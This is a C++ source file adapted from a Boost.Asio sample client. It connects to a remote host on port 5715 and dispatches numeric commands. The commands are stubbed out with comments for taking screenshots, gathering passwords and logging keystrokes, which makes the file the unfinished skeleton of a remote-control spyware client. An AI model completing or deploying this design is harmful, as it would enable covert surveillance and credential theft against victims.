//
// client.cpp
// ~~~~~~~~~~
//
// Copyright (c) 2003-2014 Christopher M. Kohlhoff (chris at kohlhoff dot com)
//
// Distributed under the Boost Software License, Version 1.0. (See accompanying
// file LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)
//

#include <iostream>
#include <boost/array.hpp>
#include <boost/asio.hpp>

using boost::asio::ip::tcp;

int main(int argc, char* argv[])
{
  try
  {
    if (argc != 2)
    {
      std::cerr << "Usage: client <host>" << std::endl;
      return 1;
    }

    boost::asio::io_service io_service;

    tcp::resolver resolver(io_service);
    tcp::resolver::query query(argv[1], "5715");
    tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);

    tcp::socket socket(io_service);
    boost::asio::connect(socket, endpoint_iterator);

    for (;;)
    {
      boost::array<char, 128> buf;
      boost::system::error_code error;

      size_t len = socket.read_some(boost::asio::buffer(buf), error);

      std::string command(buf.begin(), buf.end());

      int cmd;
      cmd = atoi (command.c_str());

      if(cmd == 143) {
        std::cout << "screenshot!" << std::endl;
        //take screenshot
      } else if (cmd == 144) {
        //gather passwords
      } else if (cmd == 145) {
        //log keystrokes
      }

      // std::cout << buf.data() << std::endl;

      if (error == boost::asio::error::eof)
        break; // Connection closed cleanly by peer.
      else if (error) {
        // std::cout << "in here" << std::endl;
        throw boost::system::system_error(error); // Some other error.
      }

      socket.write_some(boost::asio::buffer(buf, len));
    }
  }
  catch (std::exception& e)
  {
    // boost::array<char, 128> buf2;
    // buf2 = "quit";
    // socket.write_some(boost::asio::buffer(buf), error);
    std::cerr << e.what() << std::endl;
  }

  return 0;
}